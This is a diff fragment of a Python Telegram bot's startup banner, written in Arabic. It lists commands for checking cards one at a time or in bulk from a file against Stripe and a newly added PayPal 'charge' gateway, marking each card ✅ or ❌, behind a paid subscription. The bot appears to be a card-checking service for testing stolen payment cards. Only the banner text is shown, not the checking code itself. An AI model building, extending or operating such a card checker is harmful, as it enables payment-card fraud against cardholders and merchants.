-    print(Fore.YELLOW + "📌 المميزات:" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • شريط تقدم متحرك للفحص الفردي" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • فحص متسلسل مع تحديث مباشر للأرقام" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • عرض ✅ و ❌ بعد كل بطاقة" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • العمل في المجموعات مع منشن البوت" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • تذكر آخر ملف لكل مستخدم" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • تنسيق نتائج احترافي" + Style.RESET_ALL)
-    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
-    print(Fore.CYAN + "📌 الأوامر:" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   📁 /lastfile - فحص آخر ملف أرسلته" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   👤 /profile - حسابي" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   📊 /stats - الإحصائيات" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💎 /subscribe - الاشتراك" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   ⚙️ /default - تعيين البوابة الافتراضية" + Style.RESET_ALL)
-    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
+    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
+    print(Fore.YELLOW + "📌 البوابات المتاحة:" + Style.RESET_ALL)
+    print(Fore.WHITE + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   💸 PayPal Charge: /pay (فردي) | /paym (ملف)" + Style.RESET_ALL)
+    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
     print(Fore.GREEN + "✅ البوت جاهز للعمل!" + Style.RESET_ALL)
     
     bot.infinity_polling()
